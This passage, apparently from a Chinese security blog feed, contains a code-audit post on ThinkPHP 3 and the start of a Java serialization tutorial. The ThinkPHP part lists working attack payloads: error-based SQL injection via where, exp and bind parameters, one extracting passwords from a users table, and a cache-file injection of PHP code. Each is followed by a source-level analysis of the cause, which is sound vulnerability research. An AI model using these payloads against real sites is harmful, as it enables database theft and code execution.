class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">C(<span class="hljs-string">&#x27;URL_MODEL&#x27;</span>); <span class="hljs-regexp">//</span> 读取URL模式配置参数，如果未配置则会返回 NULL<br>参数名称不能含有 . 和特殊字符<br><br>C(<span class="hljs-string">&#x27;my_config&#x27;</span>,null,<span class="hljs-string">&#x27;default_config&#x27;</span>); <span class="hljs-regexp">//</span> 如果my_config尚未设置的话，则返回default_config字符串<br><br>C(<span class="hljs-string">&#x27;USER_CONFIG.USER_TYPE&#x27;</span>); <span class="hljs-regexp">//</span>读取二维配置，获取用户配置中的用户类型设置<br><br>动态配置<br>C(<span class="hljs-string">&#x27;DATA_CACHE_TIME&#x27;</span>,<span class="hljs-number">60</span>); <span class="hljs-regexp">//</span> 动态改变缓存有效期<br>动态配置赋值仅对当前请求有效，不会对以后的请求造成影响。<br><br>二维配置<br><span class="hljs-regexp">//</span> 获取已经设置的参数值<br>C(<span class="hljs-string">&#x27;USER_CONFIG.USER_TYPE&#x27;</span>);<br><span class="hljs-regexp">//</span> 设置新的值<br>C(<span class="hljs-string">&#x27;USER_CONFIG.USER_TYPE&#x27;</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><strong>架构</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926135357258.png" alt="image-20210926135357258"></p><blockquote><p>ThinkPHP 框架的 URL 是区分大小写的</p><p><code>&#39;URL_CASE_INSENSITIVE&#39; =&gt; true</code> 设置为 True 表示不区分大小写</p></blockquote><p>D 方法，实例化对象</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-string">&#x27;User&#x27;</span>)</span></span>  <span class="hljs-comment">// 实例化 UserModel</span><br><span class="hljs-function"><span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-string">&#x27;User&#x27;</span>,<span class="hljs-string">&#x27;Logic&#x27;</span>)</span></span> <span class="hljs-comment">// 实例化 UserLogic</span><br><span class="hljs-function"><span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-string">&#x27;User&#x27;</span>,<span class="hljs-string">&#x27;Service&#x27;</span>)</span></span> <span class="hljs-comment">// 实例化 UserService</span><br></code></pre></td></tr></table></figure><p><strong>控制器</strong></p><p>I 方法是 ThinkPHP 中获取系统输入变量的，可以用于任何地方</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">I(<span class="hljs-string">&#x27;变量类型.变量名/修饰符&#x27;</span>,[<span class="hljs-string">&#x27;默认值&#x27;</span>],[<span class="hljs-string">&#x27;过滤方法或正则&#x27;</span>],[<span class="hljs-string">&#x27;额外数据源&#x27;</span>])<br>I(<span class="hljs-string">&#x27;get.id&#x27;</span>); <span class="hljs-regexp">//</span> 等价于 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]<br>I(<span class="hljs-string">&#x27;get.id&#x27;</span>,<span class="hljs-number">0</span>); <span class="hljs-regexp">//</span> 如果不存在 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] 就返回 <span class="hljs-number">0</span><br>I(<span class="hljs-string">&#x27;get.name&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>); <span class="hljs-regexp">//</span> 使用 htmlspecialchars 过滤，如果没有就返回空<br></code></pre></td></tr></table></figure><p><strong>模型</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gams">模型实例化<br><span class="hljs-number">1.</span> <span class="hljs-symbol">$</span>user = new \Home\<span class="hljs-keyword">Model</span>\UserModel();<br><span class="hljs-number">2.</span> <span class="hljs-symbol">$</span>user = D(<span class="hljs-string">&#x27;User&#x27;</span>);<br>如果只对数据表进行基本的 CURD 操作，使用 M 方法的可能性会更高一点<br>   <span class="hljs-symbol">$</span>User = M(<span class="hljs-string">&#x27;User&#x27;</span>); <span class="hljs-comment">// $User = new \Think\Model(&#x27;User&#x27;)</span><br>   <span class="hljs-symbol">$</span>User-&gt;select()<br><span class="hljs-number">3.</span> 实例化空模型<br><span class="hljs-symbol">$</span><span class="hljs-keyword">Model</span> = new  <span class="hljs-keyword">Model</span>();<br><span class="hljs-symbol">$</span><span class="hljs-keyword">Model</span> = M(); <span class="hljs-comment">// 与上面等价</span><br><span class="hljs-symbol">$</span><span class="hljs-keyword">Model</span>-&gt;query(<span class="hljs-string">&#x27;SELECT * FROM think_user WHERE status = 1&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>数据库操作</strong></p><blockquote><p>ThinkPHP 3 模型基础类 Model 类提供了很多操作数据库的方法</p></blockquote><p><code>where()</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">where</span> 方法的参数支持的字符串和数组，主要用于获取 <span class="hljs-keyword">SQL</span> 语句的 <span class="hljs-keyword">where</span> 部分<br></code></pre></td></tr></table></figure><p><code>select()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">获取数据表中的多行记录<br></code></pre></td></tr></table></figure><p><code>find()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">获取数据表中的一行数据<br></code></pre></td></tr></table></figure><p><strong>安全过滤机制</strong></p><blockquote><p>ThinkPHP 3 的 I 方法和数据库操作时都会提供一个自动安全过滤的操作</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;DEFAULT_FILTER&#x27;</span>        =&gt;  <span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>, <span class="hljs-regexp">//</span> 默认参数过滤方法 用于I函数...<br></code></pre></td></tr></table></figure><p>但是 ThinkPHP3.2.3 中敏感字符不包含 BIND，因此这里就存在一个 SQL 注入的风险</p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="where-注入"><a href="#where-注入" class="headerlink" title="where 注入"></a>where 注入</h5><p>环境配置</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926153619171.png" alt="image-20210926153619171"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926151434094.png" alt="·"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926153052777.png" alt="image-20210926153052777"></p><p><strong>where注入</strong></p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?id[where]=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=updatexml(1,concat(0x7e,(select passwd <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit 1),0x7e),1)%23<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926153659388.png" alt="image-20210926153659388"></p><p>成功产生报错注入</p><p><strong>原理分析</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928194920426.png" alt="image-20210928194920426"></p><p>首先传入 <code>id=1&#39;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928160906064.png" alt="image-20210928160906064"></p><p><code>I()</code> 方法获取参数，并且使用默认的 <code>htmlspecialchars()</code> 过滤参数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928161423771.png" alt="image-20210928161423771"></p><p><code>htmlspecialchars()</code> 将特殊的字符转换为 HTML 实体</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928161715938.png" alt="image-20210928161715938"><br><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928183704166.png" alt="image-20210928183704166"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926155823448.png" alt="image-20210926155823448"></p><p><code>is_array()</code> 判断数据是不是数组，<code>array_walk_recursive()</code> 对数组的所有元素递归的应用用户函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928164612358.png" alt="image-20210928164612358"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926164810199.png" alt="image-20210926164810199"></p><blockquote><p>上面这个函数，如果发现恶意字符就会在末尾加上一个空格 ，加空格有什么用呢？？？</p><p>并且这里只匹配了以这些东西开头的情况，这个过滤写得不严谨，感觉相当于没有写</p></blockquote><p>第一行的 <code>I()</code> 方法主要提取参数，并且利用函数过滤参数的危险字符，之后转向 <code>M()</code> 方法实例化 <code>User</code>，之后又运行 <code>find()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928172646948.png" alt="image-20210928172646948"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928173329266.png" alt="image-20210928173329266"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($options[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; is_array($options[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>($fields) &amp;&amp; !<span class="hljs-keyword">isset</span>($options[<span class="hljs-string">&#x27;join&#x27;</span>]))<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928191804739.png" alt="image-20210928191804739"></p><p>这里由于 <code>$options[&#39;where&#39;] </code>是数组所以，就会加入<code>_parseType()</code>就行强制类型转换</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928173405525.png" alt="image-20210928173405525"></p><p>一下是传入 <code>id=1&#39;</code> 时，<code>id</code> 会被强制转换为 1，然后返回到查询语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928182233997.png" alt="image-20210928182233997"></p><p>所以最后的结果是正常的返回</p><p>使用 payload 测试</p> <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?id[where]=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=updatexml(1,concat(0x7e,(select passwd <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit 1),0x7e),1)%23<br></code></pre></td></tr></table></figure><p>这里逃过了 <code>think_filter()</code> 的过滤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928183338455.png" alt="image-20210928183338455"></p><p>这里 payload 直接绕过了过滤函数的检查，在进入 <code>find()</code>  后，又跳过了 <code>_paraseType()</code>函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928191259855.png" alt="image-20210928191259855"></p><blockquote><p>由于 $options[‘where’] 不是数组，所以这里就直接跳过了 <code>_parseType()</code> 的强制类型转换</p></blockquote><p>如果<code>payload</code> 直接传入 <code>id</code> 而不是 <code>id[where]</code> 这样就会被进入下面的<code>_parseType()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928192035202.png" alt="image-20210928192035202"></p><p>这样绕过了所有的过滤拼接到了 <code>where</code> 上面，造成了报错注入</p><h5 id="EXP注入"><a href="#EXP注入" class="headerlink" title="EXP注入"></a>EXP注入</h5><p>修改入口</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">payload:<br>?username[<span class="hljs-number">0</span>]=exp&amp;username[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928193731317.png" alt="image-20210928193731317"></p><p><strong>漏洞分析</strong></p><p><code>D()</code>方法快速实例化对象</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928200500948.png" alt="image-20210928200500948"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928193959972.png" alt="image-20210928193959972"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">in_array() 检测数组中是否存在某个值<br>第一个参数是待搜索的值（区分大小写） 第二个参数是待搜索的数组<br><br>is_scalar() 检查待检测变量是否为标量<br>标量变量是指 int、float、string 或 bool 类型的变量。 array、object 和<span class="hljs-built_in"> resource </span>类型不是标量<br></code></pre></td></tr></table></figure><p>下断点接着调，其他的函数操作没有什么影响</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928210028057.png" alt="image-20210928210028057">重点在下面这里</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928205333203.png" alt="image-20210928205333203"></p><blockquote><p>为什么不用 <code>I()</code> 接受参数，因为使用了 <code>I()</code> 接受参数的话这里的 $exp 就会变成 <code>exp空格</code> 就不能跳入之后的判断 </p><p>这里直接使用 bind 的话，sql 语句会拼接错误，所以 bind 的注入需要使用其他技巧</p></blockquote><h5 id="bind-注入"><a href="#bind-注入" class="headerlink" title="bind 注入"></a>bind 注入</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">payload<br>?id[<span class="hljs-number">0</span>]=bind&amp;id[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)&amp;passwd=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928210254401.png" alt="image-20210928210254401"></p><blockquote><p><code>save()</code> 方法的返回值是<strong>影响的记录数</strong>，如果返回false则表示更新出错，因此一定要用恒等来判断是否更新失败</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">$User = M(<span class="hljs-string">&quot;Users&quot;</span>); <span class="hljs-comment">// 实例化user</span><br>$user[<span class="hljs-string">&#x27;id&#x27;</span>] = I(<span class="hljs-string">&#x27;id&#x27;</span>);  <span class="hljs-comment">// 获取 id 并且进行简单的过滤</span><br>$data[<span class="hljs-string">&#x27;password&#x27;</span>] = I(<span class="hljs-string">&#x27;passwd&#x27;</span>); <span class="hljs-comment">// 获取 passwd 并且进行简单的过滤</span><br>$valu = $User-&gt;where($user)-&gt;save($data); <span class="hljs-comment">// 查询结果</span><br>var_dump($valu);<br></code></pre></td></tr></table></figure><p>这里直接从<code>$valu = $User-&gt;where($user)-&gt;save($data);</code> 看起</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928213331107.png" alt="image-20210928213331107"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928213731615.png" alt="image-20210928213731615"></p><blockquote><p>这里会直接跳出 <code>_parseType()</code> 所以这个函数对参数无影响</p></blockquote><p>最后的参数拼接</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928214024437.png" alt="image-20210928214024437"></p><p>最后拼接成的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928214254837.png" alt="image-20210928214254837"></p><p>why id[1] 要选择 0 ？</p><p>看到上面的结果，可以发现 SQL 语句格式还是不对的，所以还是继续往下走</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928215309034.png" alt="image-20210928215309034"></p><p><code>strstr()</code> 返回字符串从字符串第一次出现的位置开始返回剩下的字符串</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928215537303.png" alt="image-20210928215537303"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928215831483.png" alt="image-20210928215831483"></p><blockquote><p>array_map() 将用户自定义函数作用到每个值上，并返回用户自定义函数作用后的带有新的值的数组</p><p>其中<code>function($val) use($that)&#123; return &#39;\&#39;&#39;.$that-&gt;escapeString($val).&#39;\&#39;&#39;; &#125;,$this-&gt;bind</code> 是匿名函数，用来检测 bin d 是否含有危险字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">$val</span>) <span class="hljs-title">use</span>(<span class="hljs-params">$that</span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span>.$that-&gt;escapeString($val).<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;&#125;,<span class="hljs-keyword">$this</span>-&gt;bind<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928220537895.png" alt="image-20210928220537895"></p><blockquote><p><code>addslashes($str)</code>函数返回在预定义字符之前添加反斜杠的字符串</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001170311345.png" alt="image-20211001170311345"></p><p>经过 <code>strstr()</code> 的处理就变成了正常的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928220040512.png" alt="image-20210928220040512"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001190445131.png" alt="image-20211001190445131"></p><blockquote><p>在本地把替换的语句分解了一遍，发现就是将字符串中存在的数组的键用值替换了，最终构造出正常的语句</p></blockquote><h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a>缓存漏洞</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">payload<br>?name=%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aphpinfo();%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001193410813.png" alt="image-20211001193410813"></p><p>缓存文件名就是 <code>mad5(name)</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001193431779.png" alt="image-20211001193431779"></p><p><strong>漏洞分析</strong></p><p>获取缓存，<code>set()</code> 方法是写入缓存数据到文件的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001202025396.png" alt="image-20211001202025396"></p><p>文件名的确定</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001203247528.png" alt="image-20211001203247528"></p><p>最终使用 <code>file_put_contents()</code> 写入文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001204822794.png" alt="image-20211001204822794"></p><p>参考文章：</p><p><a href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p><p><a href="https://www.kancloud.cn/manual/thinkphp/1678">https://www.kancloud.cn/manual/thinkphp/1678</a></p><p><a href="https://www.freebuf.com/vuls/282906.html">https://www.freebuf.com/vuls/282906.html</a></p><p><a href="https://www.cnblogs.com/-qing-/p/11444871.html">https://www.cnblogs.com/-qing-/p/11444871.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-3&quot;&gt;&lt;a href=&quot;#ThinkPHP-3&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 3&quot;&gt;&lt;/a&gt;ThinkPHP 3&lt;/h1&gt;&lt;h2 id=&quot;框架学习&quot;&gt;&lt;a href=&quot;#框架学习&quot; class=&quot;head</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Java序列化基础</title>
    <link href="http://example.com/2021/10/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2021/10/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</id>
    <published>2021-10-22T16:34:36.000Z</published>
    <updated>2021-11-10T00:51:08.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-反序列化基础"><a href="#Java-反序列化基础" class="headerlink" title="Java 反序列化基础"></a>Java 反序列化基础</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化的过程就是把字节流还原成对象。Java 中的<code>ObjectOutputStream</code>类得 <code>writeObject()</code> 方法可以实现序列化，<code>ObjectInputStream</code>类得<code>readObject()</code>方法用于反序列化。</p><p>Java 序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成 Java 对象而被非常频繁的被用于 <code>Socket</code> 传输。 在 <code>RMI(Java远程方法调用-Java Remote Method Invocation)</code> 和 <code>JMX(Java管理扩展-Java Management Extensions)</code> 服务中对象反序列化机制被强制性使用。在 HTTP 请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用Base编码序列化字节字符串的方式传递等。</p><h2 id="Java-序列化-反序列化"><a href="#Java-序列化-反序列化" class="headerlink" title="Java 序列化 / 反序列化"></a>Java 序列化 / 反序列化</h2><p>Java 中要实现对象序列化需要实现 <code>java.io.Serializable(内部序列化)</code> 或 <code>java.io.Externalizable(外部序列化)</code> 接口即可被序列化，其中<code>java.io.Externalizable</code>接口实现了<code>java.io.Serializable</code>接口</p><p>反序列化类对象有如下限制：</p><ol><li>被反序列化的类必须存在</li><li><code>serialVersionUID</code>值必须一致</li></ol><blockquote><p>反序列化类对象是不会调用该类构造方法的</p></blockquote><p>对象序列化保存的是对象的“状态”，即它的成员变量，对象序列化不会关注类中的静态变量。除了在持久化对象时会用到对象序列化之外，使用 RMI 或者在网络传递对象时都会用到对象序列化。</p><h2 id="序列化与反序列化相关知识"><a href="#序列化与反序列化相关知识" class="headerlink" title="序列化与反序列化相关知识"></a>序列化与反序列化相关知识</h2><ol><li>只要实现了 <code>java.io.Serializable</code>接口就可以被序列化</li><li>通过 <code>ObjectOutputStream</code> 和 <code>ObjectInputStream</code> 对对象进行序列化与反序列化</li><li>虚拟机是否允许反序列化，不仅取决于类路径和功能是否一致，也与两个类的序列化 ID （<code>private static final long serialVersionUID</code>）是否一致有关</li><li>序列化不保存静态变量</li><li>想要将父类对象也序列化需要让父类也实现序列化接口</li><li><code>Transient</code> 关键字的作用时控制变量的序列化，在变量前加上它可以阻止该变量被序列化到文件中，在被序列化后，<code>Transient</code> 变量的值被设定为初始值，如 int 型是 0，对象型是 null</li><li>服务端给客户端发送序列化对象数据，对象中有一些数据是敏感的，比如密码字符串等，希望对该密码字段在序列化时进行加密，而客户端如果拥有解密的密钥，只有在客户端进行反序列化时才可以对密码进行读取，这样可以在一定程度上保证对象的数据安全</li></ol><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 测试类</span><br><span class="hljs-keyword">package</span> com;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-comment">// 类想要被序列化，必须实现 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">People</span><span class="hljs-params">()</span></span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;无参构造！！&quot;</span>);<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">People</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> age)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.name = name;<br>            <span class="hljs-keyword">this</span>.age = age;<br>            System.out.println(<span class="hljs-string">&quot;有参构造！！！&quot;</span>);<br>        &#125;<br>    <span class="hljs-comment">// 重写 toString 方法</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        People people = <span class="hljs-keyword">new</span> People(<span class="hljs-string">&quot;lcdm124&quot;</span>,<span class="hljs-number">12</span>);<br>        <span class="hljs-comment">// 序列化</span><br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;E:/test.ser&quot;</span>));<br>        objectOutputStream.writeObject(people);<br>        objectOutputStream.close();<br>        System.out.println(<span class="hljs-string">&quot;----------&quot;</span>);<br>        <span class="hljs-comment">// 反序列化</span><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;E:/test.ser&quot;</span>));<br>        People p = (People) objectInputStream.readObject();<br>        System.out.println(p);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20211018164134629.png" alt="image-20211018164134629"></p><p>序列化文件中的内容</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20211018164213927.png" alt="image-20211018164213927"></p><p>其中 <code>ac ed 00 05</code> 是 Java 序列化的特征码</p><p><code>Transient</code> 关键字的作用时控制变量的序列化，在变量前加上它可以阻止该变量被序列化到文件中，在被序列化后，<code>Transient</code> 变量的值被设定为初始值，如 int 型是 0，对象型是 null</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211022235624330.png" alt="image-20211022235624330"></p><p>同一类序列化与反序列化前后的 <code>serialVersionUID</code> 需要一样，不然就会反序列化异常</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023000028586.png" alt="image-20211023000028586"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023000051090.png" alt="image-20211023000051090"></p><h2 id="理解-writeObject-和-readObject"><a href="#理解-writeObject-和-readObject" class="headerlink" title="理解 writeObject() 和 readObject()"></a>理解 writeObject() 和 